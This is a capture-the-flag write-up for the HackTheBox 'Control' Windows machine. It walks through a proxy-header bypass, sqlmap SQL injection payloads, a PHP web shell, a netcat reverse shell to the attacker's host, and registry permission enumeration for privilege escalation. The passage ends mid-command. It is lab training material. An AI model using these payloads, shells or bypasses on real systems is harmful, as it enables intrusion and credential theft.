---
title: "HackTheBox Writeup: Control"
date: 2020-07-21T13:23:03+02:00
tags:
  - hackthebox
  - ctf
  - writeup
showdate: true
toc: true
---

Control is a Hard difficulty Windows CTF (yay!) from HackTheBox. Control was a very good challenge, it starts out in a pretty generic manner, requiring the exploitation of a SQL injection flaw in a web application that only allows users connecting from a specific proxy, but when local access is established the real fun begins.

And by fun I mean trial and error, because there is quite a bit of guess work going on in the privilege escalation part, but even if the box doesn’t tell you what to do in a huge font it still leaves out some hints so that you can get there in the end, when you realize that in order to escalate privileges you have to find a Windows service of which you can change the properties from the registry to hijack its execution when it is then started, which I thought was a pretty cool idea.

I originally posted this on [0x00sec](https://0x00sec.org/t/hackthebox-writeup-control/20801) but the images of a lot of threads there are appearing broken, so I want to make sure an intact copy of this exists somewhere. This blog is supposed to be an archive of sort, after all.

![img](/images/writeup-control/1.png)

---

## Enumeration

A full nmap scan doesn’t reveal a big attack surface, with just HTTP MS-RPC and MySQL available:

```aaa
baud@kali:~/HTB/control$ sudo nmap -sC -sV -p- -T5 -oA fullScan 10.10.10.167
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-05 21:17 CEST
Nmap scan report for 10.10.10.167
Host is up (0.064s latency).
Not shown: 65530 filtered ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Fidelity
135/tcp   open  msrpc   Microsoft Windows RPC
3306/tcp  open  mysql?
| fingerprint-strings: 
|   DNSVersionBindReqTCP, JavaRMI, TerminalServer, WMSRequest: 
|_    Host '10.10.15.203' is not allowed to connect to this MariaDB server
49666/tcp open  msrpc   Microsoft Windows RPC
49667/tcp open  msrpc   Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.80%I=7%D=4/5%Time=5E8A301A%P=x86_64-pc-linux-gnu%r(DNS
SF:VersionBindReqTCP,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.15\.203'\x20is
SF:\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server"
SF:)%r(TerminalServer,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.15\.203'\x20i
SF:s\x20not\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server
SF:")%r(JavaRMI,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.15\.203'\x20is\x20n
SF:ot\x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server")%r(W
SF:MSRequest,4B,"G\0\0\x01\xffj\x04Host\x20'10\.10\.15\.203'\x20is\x20not\
SF:x20allowed\x20to\x20connect\x20to\x20this\x20MariaDB\x20server");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 371.52 seconds
```

The IIS web server has a neat little application running that looks like this:

![img](/images/writeup-control/2.png)

The only apparently interesting feature here is the Admin button, upon clicking it we are given an error stating we must go through a proxy in order to access the page, and that this proxy is supposed to add a special header to our HTTP requests:

![img](/images/writeup-control/3.png)

Here are a few headers commonly added by HTTP proxies when a client goes through one:

```http
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
```

With a 127.0.0.1 address in, these headers actually become possible bypasses. A proxy will replace the 127.0.0.1 address with that of the client making the request to the application, which will check if the supplied IP is authorized to access the desired page.

Using 127.0.0.1 as the value of all these headers is a typical bypass based on the assumption that the server trusts requests coming from itself, thus thinking the requests come from a host that is authorized to access the application of interest.

Unfortunately for us, adding these headers manually with Burp and making a request to the Admin page returns the same exact error as before, meaning we are missing something. Perhaps localhost is not in the app’s access control whitelist. We’ll be back here soon.

Running Dirbuster allows to find a bunch of files and folders that are not apparent from the main site accessible to unauthenticated users, mainly the uploads folder and a bunch of PHP pages that have to do with product management of some sort (don’t mind the n2s.php page, it’s a web shell dropped by some other user):

![img](/images/writeup-control/4.png)

Other PHP pages are referenced by the /assets/js/functions.js script:

```js
function deleteProduct(id) {
	document.getElementById("productId").value = id;
	document.forms["viewProducts"].action = "delete_product.php";
	document.forms["viewProducts"].submit();
}
function updateProduct(id) {
	document.getElementById("productId").value = id;
	document.forms["viewProducts"].action = "update_product.php";
	document.forms["viewProducts"].submit();
}
function viewProduct(id) {
	document.getElementById("productId").value = id;
	document.forms["viewProducts"].action = "view_product.php";
	document.forms["viewProducts"].submit();
}
function deleteCategory(id) {
	document.getElementById("categoryId").value = id;
	document.forms["categoryOptions"].action = "delete_category.php";
	document.forms["categoryOptions"].submit();
}
function updateCategory(id) {
	document.getElementById("categoryId").value = id;
	document.forms["categoryOptions"].action = "update_category.php";
	document.forms["categoryOptions"].submit();
}
```

Plus, /assets/js/checkvalues.js implements some client-side checks for the validity of user supplied input, a probable indicator of custom code running in the web application’s Admin area where those product-related PHP pages can be accessed:

```js
function checkValues(form) {
   if (form == "updateProduct") {
      var name = document.forms["updateProduct"]["name"].value;
      var quantity = document.forms["updateProduct"]["quantity"].value;
      var price = document.forms["updateProduct"]["price"].value;
      if (name.length <= 0) {
         alert("Name cannot be empty!");
         return false;
      }
      if (quantity < 0 || quantity == "") {
         alert("Quantity cannot be less than 0!");
         return false;
      }
      if (price == 0 || price.includes("-")) {
         alert("Price must be greater than 0");
         return false;
      }
   } else if (form == "createProduct") {
      var name = document.forms["createProduct"]["name"].value;
      var quantity = document.forms["createProduct"]["quantity"].value;
      var price = document.forms["createProduct"]["price"].value;
      if (name.length <= 0) {
         alert("Name cannot be empty!");
         return false;
      }
      if (quantity < 0 || quantity == "") {
         alert("Quantity cannot be less than 0!");
         return false;
      }
      if (price == 0 || price.includes("-")) {
         alert("Price must be greater than 0");
         return false;
      }
   } else if (form == "createCategory") {
      var name = document.forms["createCategory"]["name"].value;
      if (name.length <= 0) {
         alert("Name cannot be empty!");
         return false;
      }
   } else if (form == "updateCategory") {
      var name = document.forms["updateCategory"]["name"].value;
      if (name.length <= 0) {
         alert("Name cannot be empty!");
         return false;
      }
   }
   return true;
}
```

I tried fuzzing these pages and their parameters blindly with wfuzz but didn’t have any success in receiving interesting output from them.

Going back to the index of the web application a comment is found in the source code:

```html
<body class="is-preload landing">
	<div id="page-wrapper">
		<!-- To Do:
			- Import Products
			- Link to new payment system
			- Enable SSL (Certificates location \\192.168.4.28\myfiles)
		<!-- Header -->
```

We can deduce from this comment that the web server is supposed to trust an external server hosting SSL certificates, with the IP address of this server we can try injecting the custom proxy headers again using the IP above instead of 127.0.0.1:

```http
X-Originating-IP: 192.168.4.28
X-Forwarded-For: 192.168.4.28
X-Remote-IP: 192.168.4.28
X-Remote-Addr: 192.168.4.28
```

It can be very uncomfortable running every request through Burp to add the headers every time since as soon as we click another link on the application a request without the header will be generated, causing us to see the error again.

To solve this issue I used the [CustomHeaders](https://github.com/mirfansulaiman/CustomHeader) Burp extension to add the headers automatically to every request caught by the Burp proxy:

![img](/images/writeup-control/5.png)

Adding all four headers with the correct IP address loads the admin page this time:

![img](/images/writeup-control/6.png)

Going by exclusion it turns out the correct proxy header the web application checks for is this one:

```http
X-Forwarded-For: 192.168.4.28
```

Anyway now that we can finally see and use the Admin page we can observe how those PHP pages from earlier are utilized. New products can be created:

![img](/images/writeup-control/7.png)

As well as new categories:

![img](/images/writeup-control/8.png)

After playing around with those functions I didn’t find them to be attackable, however SQL errors can be triggered by adding a single quote in the search field at the top of the page, so the search_products.php page appears to be vulnerable to SQL injection:

![img](/images/writeup-control/9.png)

---

## Exploitation: SQL Injection (DB dump, file upload)

We can use sqlmap to exploit the flaw and dump the passwords in the databases, making sure to add the proxy header to the requests for good measure:

```aaa
baud@kali:~/HTB/control$ sqlmap --passwords -u http://10.10.10.167/search_products.php --data='productName=name' --headers='X-Forwarded-For: 192.168.4.28'
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 22:07:45 /2020-04-05/

[22:07:45] [INFO] resuming back-end DBMS 'mysql' 
[22:07:45] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: productName (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: productName=-3076' OR 6013=6013#

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: productName=name' AND (SELECT 4131 FROM(SELECT COUNT(*),CONCAT(0x7178627071,(SELECT (ELT(4131=4131,1))),0x7176627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- dzoa

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: productName=name';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: productName=name' AND (SELECT 4951 FROM (SELECT(SLEEP(5)))YygG)-- NmJz

    Type: UNION query
    Title: MySQL UNION query (NULL) - 6 columns
    Payload: productName=name' UNION ALL SELECT NULL,CONCAT(0x7178627071,0x6a49496f58625764426b464f4c6f6f4d746c4556795965514d6442736f747a527778414d726c7a64,0x7176627871),NULL,NULL,NULL,NULL#
---
[22:07:45] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[22:07:45] [INFO] fetching database users password hashes
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[22:07:49] [INFO] writing hashes to a temporary file '/tmp/sqlmap0n205v2b6830/sqlmaphashes-krexg5ga.txt' 
do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] n
database management system users password hashes:
[*] hector [1]:
    password hash: *0E178792E8FC304A2E3133D535D38CAF1DA3CD9D
[*] manager [1]:
    password hash: *CFE3EEE434B38CBF709AD67A4DCDEA476CBA7FDA
[*] root [1]:
    password hash: *0A4A5CAD344718DC418035A1F4D292BA603134D8

[22:07:51] [INFO] fetched data logged to text files under '/home/baud/.sqlmap/output/10.10.10.167'
[22:07:51] [WARNING] you haven't updated sqlmap for more than 64 days!!!

[*] ending @ 22:07:51 /2020-04-05/
```

The program was able to pull three different hashes as well as the usernames they belong to, two of those hashes are easily matched with cleartext passwords by [CrackStation](https://crackstation.net/) so we don’t even have to bruteforce anything:

![img](/images/writeup-control/10.png)

This gives us two sets of possible credentials:

```aaa
User: hector
Pass: l33th4x0rhector

User: manager
Pass: l3tm3!n
```

The first thing I tried doing with the credentials is connecting to the MySQL server using the mysql client, however we are not authorized to access the server:

```aaa
baud@kali:~/HTB/control$ mysql -h 10.10.10.167 -u manager -p
Enter password: 
ERROR 1130 (HY000): Host '10.10.15.203' is not allowed to connect to this MariaDB server
```

So back to sqlmap, another possible way in is using the SQL injection vulnerability to upload arbitrary files on the server, like a simple PHP shell to execute shell commands. Here we’re going to have to guess the name of a directory we can write to, I went for the uploads folder found earlier and assumed it is located in the default IIS directory, C:\inetpub\wwwroot. Luckily the assumption was correct and the file was written on the server:

```aaa
baud@kali:~/HTB/control$ sqlmap -u http://10.10.10.167/search_products.php --data='productName=name' --headers='X-Forwarded-For: 192.168.4.28' --file-write=./baud.php --file-dest='C:\\inetpub\\wwwroot\\uploads\\baud3.php'
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.2#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 17:27:43 /2020-04-06/

[17:27:43] [INFO] resuming back-end DBMS 'mysql' 
[17:27:43] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: productName (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: productName=-3076' OR 6013=6013#

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: productName=name' AND (SELECT 4131 FROM(SELECT COUNT(*),CONCAT(0x7178627071,(SELECT (ELT(4131=4131,1))),0x7176627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- dzoa

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: productName=name';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: productName=name' AND (SELECT 4951 FROM (SELECT(SLEEP(5)))YygG)-- NmJz

    Type: UNION query
    Title: MySQL UNION query (NULL) - 6 columns
    Payload: productName=name' UNION ALL SELECT NULL,CONCAT(0x7178627071,0x6a49496f58625764426b464f4c6f6f4d746c4556795965514d6442736f747a527778414d726c7a64,0x7176627871),NULL,NULL,NULL,NULL#
---
[17:27:43] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[17:27:43] [INFO] fingerprinting the back-end DBMS operating system
[17:27:43] [INFO] the back-end DBMS operating system is Windows
[17:27:44] [WARNING] potential permission problems detected ('Access denied')
[17:27:44] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)            
do you want confirmation that the local file 'baud.php' has been successfully written on the back-end DBMS file system ('C:/inetpub/wwwroot/uploads/baud3.php')? [Y/n] y
[17:27:47] [INFO] the local file 'baud.php' and the remote file 'C:/inetpub/wwwroot/uploads/baud3.php' have the same size (80 B)
[17:27:47] [INFO] fetched data logged to text files under '/home/baud/.sqlmap/output/10.10.10.167'
[17:27:47] [WARNING] you haven't updated sqlmap for more than 65 days!!!

[*] ending @ 17:27:47 /2020-04-06/
```

The shell is very simple and only has the purpose of giving me the ability to launch a different shell since I wasn’t able to execute OS commands from sqlmap itself using --os-cmd or --os-shell:

```php
<html>
<body>
	<pre>
	<?php
		system($_GET['cmd']);
	?>
	</pre>
</body>
</html>
```

The shell I want to launch makes use of [nc for Windows](https://eternallybored.org/misc/netcat/) so I uploaded the binary in the same folder as well:

```aaa
baud@kali:~/HTB/control$ sqlmap -u http://10.10.10.167/search_products.php --data='productName=name' --headers='X-Forwarded-For: 192.168.4.28' --file-write=./nc.exe --file-dest='C:\\inetpub\\wwwroot\\uploads\\nc.exe'
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 23:24:01 /2020-04-06/

[23:24:01] [INFO] resuming back-end DBMS 'mysql' 
[23:24:01] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: productName (POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
    Payload: productName=-3076' OR 6013=6013#

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: productName=name' AND (SELECT 4131 FROM(SELECT COUNT(*),CONCAT(0x7178627071,(SELECT (ELT(4131=4131,1))),0x7176627871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- dzoa

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: productName=name';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: productName=name' AND (SELECT 4951 FROM (SELECT(SLEEP(5)))YygG)-- NmJz

    Type: UNION query
    Title: MySQL UNION query (NULL) - 6 columns
    Payload: productName=name' UNION ALL SELECT NULL,CONCAT(0x7178627071,0x6a49496f58625764426b464f4c6f6f4d746c4556795965514d6442736f747a527778414d726c7a64,0x7176627871),NULL,NULL,NULL,NULL#
---
[23:24:02] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[23:24:02] [INFO] fingerprinting the back-end DBMS operating system
[23:24:02] [INFO] the back-end DBMS operating system is Windows
[23:24:02] [WARNING] potential permission problems detected ('Access denied')
[23:24:15] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)              
do you want confirmation that the local file 'nc.exe' has been successfully written on the back-end DBMS file system ('C:/inetpub/wwwroot/uploads/nc.exe')? [Y/n] y
[23:24:19] [INFO] the local file 'nc.exe' and the remote file 'C:/inetpub/wwwroot/uploads/nc.exe' have the same size (28160 B)
[23:24:19] [INFO] fetched data logged to text files under '/home/baud/.sqlmap/output/10.10.10.167'
[23:24:19] [WARNING] you haven't updated sqlmap for more than 65 days!!!

[*] ending @ 23:24:19 /2020-04-06/
```

Check if the web shell works as intended:

![img](/images/writeup-control/11.png)

Now with a single request to that page we can start a proper reverse shell using nc and we’re in:

```aaa
baud@kali:~/HTB/control$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.15.203] from (UNKNOWN) [10.10.10.167] 57762
Microsoft Windows [Version 10.0.17763.805]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\wwwroot\uploads>
```

---

## Escalating to Hector and local enumeration

As it turns out the Manager user does not exist, but Hector does have an account on the system:

```aaa
C:\inetpub\wwwroot\uploads>dir c:\users
dir c:\users
 Volume in drive C has no label.
 Volume Serial Number is C05D-877F

 Directory of c:\users

11/05/2019  03:34 PM    <DIR>          .
11/05/2019  03:34 PM    <DIR>          ..
11/05/2019  03:34 PM    <DIR>          Administrator
11/01/2019  12:09 PM    <DIR>          Hector
10/21/2019  05:29 PM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  43,519,860,736 bytes free

C:\inetpub\wwwroot\uploads>
```

Because we already have found Hector’s password we can switch to it with a [PSSession](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_pssessions?view=powershell-7):

```aaa
C:\inetpub\wwwroot\uploads>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\wwwroot\uploads> $pw = ConvertTo-SecureString -String "l33th4x0rhector" -AsPlainText -force
$pw = ConvertTo-SecureString -String "l33th4x0rhector" -AsPlainText -force
PS C:\inetpub\wwwroot\uploads> $pp = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ".\Hector", $pw
$pp = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ".\Hector", $pw
PS C:\inetpub\wwwroot\uploads> Enter-PSSession -ComputerName localhost -Credential $pp
Enter-PSSession -ComputerName localhost -Credential $pp
[localhost]: PS C:\Users\Hector\Documents> whoami
whoami
control\hector
[localhost]: PS C:\Users\Hector\Documents>
```

And then launch nc.exe again to have a more comfortable shell instead of the awkward Invoke-Command syntax:

```powershell
[localhost]: PS C:\Users\Hector\Documents> Invoke-Command -ScriptBlock { C:\inetpub\wwwroot\uploads\nc.exe -e cmd.exe 10.10.15.203 9898 }
```

![img](/images/writeup-control/12.png)

Looking for interesting files, the only thing that sticks out is Hector’s’ PowerShell history located in AppData:

```aaa
C:\Users\Hector\AppData>dir C:\Users\Hector\AppData\roaming\microsoft\windows\powershell\psreadline
dir C:\Users\Hector\AppData\roaming\microsoft\windows\powershell\psreadline
 Volume in drive C has no label.
 Volume Serial Number is C05D-877F

 Directory of C:\Users\Hector\AppData\roaming\microsoft\windows\powershell\psreadline

11/25/2019  12:04 PM    <DIR>          .
11/25/2019  12:04 PM    <DIR>          ..
11/25/2019  02:36 PM               114 ConsoleHost_history.txt
               1 File(s)            114 bytes
               2 Dir(s)  43,519,021,056 bytes free

C:\Users\Hector\AppData>
```

It contains the following commands:

```aaa
C:\Users\Hector\AppData>more C:\Users\Hector\AppData\roaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txt
more C:\Users\Hector\AppData\roaming\microsoft\windows\powershell\psreadline\ConsoleHost_history.txt
get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
get-acl HKLM:\SYSTEM\CurrentControlSet | format-list

C:\Users\Hector\AppData>
```

There are two commands that query the registry, replicating the first one returns this output:

```aaa
C:\Users\Hector\AppData>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\Hector\AppData> get-childitem HKLM:\SYSTEM\CurrentControlset | format-list
get-childitem HKLM:\SYSTEM\CurrentControlset | format-list


Property      : {BootDriverFlags, CurrentUser, EarlyStartServices, PreshutdownOrder...}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Control
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Control
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 121
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 11
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Control

Property      : {NextParentID.daba3ff.2, NextParentID.61aaa01.3, NextParentID.1bd7f811.4, NextParentID.2032e665.5...}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Enum
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Enum
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 17
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 27
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Enum

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Hardware Profiles
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Hardware Profiles
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 3
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Hardware Profiles

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Policies
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Policies
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 0
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Policies

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Services
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 667
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services

Property      : {}
PSPath        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Software
PSParentPath  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset
PSChildName   : Software
PSDrive       : HKLM
PSProvider    : Microsoft.PowerShell.Core\Registry
PSIsContainer : True
SubKeyCount   : 1
View          : Default
Handle        : Microsoft.Win32.SafeHandles.SafeRegistryHandle
ValueCount    : 0
Name          : HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Software
```

This is just used to return all the child items of the CurrentControlSet registry location. The second command on the other hand shows the access control list of the same registry entry:

```aaa
PS C:\Users\Hector\AppData> get-acl HKLM:\SYSTEM\CurrentControlSet | format-list
get-acl HKLM:\SYSTEM\CurrentControlSet | format-list


Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : BUILTIN\Administrators Allow  FullControl
         NT AUTHORITY\Authenticated Users Allow  ReadKey
         NT AUTHORITY\Authenticated Users Allow  -2147483648
         S-1-5-32-549 Allow  ReadKey
         S-1-5-32-549 Allow  -2147483648
         BUILTIN\Administrators Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         NT AUTHORITY\SYSTEM Allow  268435456
         CREATOR OWNER Allow  268435456
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
         APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  -2147483648
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  
         ReadKey
         S-1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681 Allow  
         -2147483648
Audit  : 
Sddl   : O:BAG:SYD:AI(A;;KA;;;BA)(A;ID;KR;;;AU)(A;CIIOID;GR;;;AU)(A;ID;KR;;;SO)(A;CIIOID;GR;;;SO)(A;ID;KA;;;BA)(A;CIIOI
         D;GA;;;BA)(A;ID;KA;;;SY)(A;CIIOID;GA;;;SY)(A;CIIOID;GA;;;CO)(A;ID;KR;;;AC)(A;CIIOID;GR;;;AC)(A;ID;KR;;;S-1-15-
         3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)(A;CIIOID;GR;;;S
         -1-15-3-1024-1065365936-1281604716-3511738428-1654721687-432734479-3232135806-4053264122-3456934681)
```

While that output does not contain very interesting info it comes from a command we can re-use for further enumeration in the next phase, which is where the guess work bit begins.

---

## Beginning of the guess work

The box gave us a few hints, now it’s up to us to put all of them together and come up with an attack vector. Judging from his PowerShell history Hector was concerned with checking the ACL of the CurrentControlSet registry entries, so maybe, just maybe, some entries in there will have some interesting or non-standard permissions that we could take advantage of. This is our first assumption.

Arguably the most interesting entry within the CurrentControlSet child items is Services. All entries in the Services folder tell Windows how to manage the installed services, how to start them, when, with what privileges, and so on.

As we should already know, Windows services typically run under the [local SYSTEM](https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account) account unless they’ve been set to use a less privileged account, like the [local service](https://docs.microsoft.com/en-us/windows/win32/services/localservice-account) or the [network service](https://docs.microsoft.com/en-us/windows/win32/services/networkservice-account) accounts.

Because of the very high privileges under which a lot of services run they make for very interesting targets. So let’s start enumerating the services this installation of Windows has enabled, simply by listing the child entries of the Services directory in the registry:

```aaa
PS C:\Users\Hector\Documents> reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services > svcs.txt
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services > svcs.txt
PS C:\Users\Hector\Documents> dir
dir


    Directory: C:\Users\Hector\Documents


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----         4/6/2020   6:58 PM          45272 nc.exe                                                                
-a----         4/6/2020   7:02 PM             11 query                                                                 
-a----         4/6/2020   7:02 PM              0 Servicenames.txt                                                      
-a----         4/6/2020   7:03 PM          85894 svcs.txt                                                              


PS C:\Users\Hector\Documents>
```

The output will look like this:

```aaa
[....]
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\netvscvfpp
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\NgcCtnrSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\NgcSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\NlaSvc
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\Npfs
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\npsvctrig
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\nsi
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\nsiproxy
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlset\Services\Ntfs
[....]
```

Transfer the output file locally using nc since we have it available, for easier analysis:

![img](/images/writeup-control/13.png)

With a list of the different service paths in the registry we can use the [Get-ACL](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-7) cmdlet that was also used by Hector to test a bunch of services for interesting permissions, I also pipe the output of the cmdlet to fl, which is an alias for [Format List](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/format-list?view=powershell-7), to avoid receiving a truncated output.

Of course this can be scripted very easily if you are not new to PowerShell, but because I suck at it I did it the manual way.

After trying out a few different services, you will eventually run into one that grants Hector full control access, like DeviceInstall:

```aaa
PS C:\Users\Hector\Documents> get-acl HKLM:\SYSTEM\CurrentControlset\Services\DeviceInstall | fl
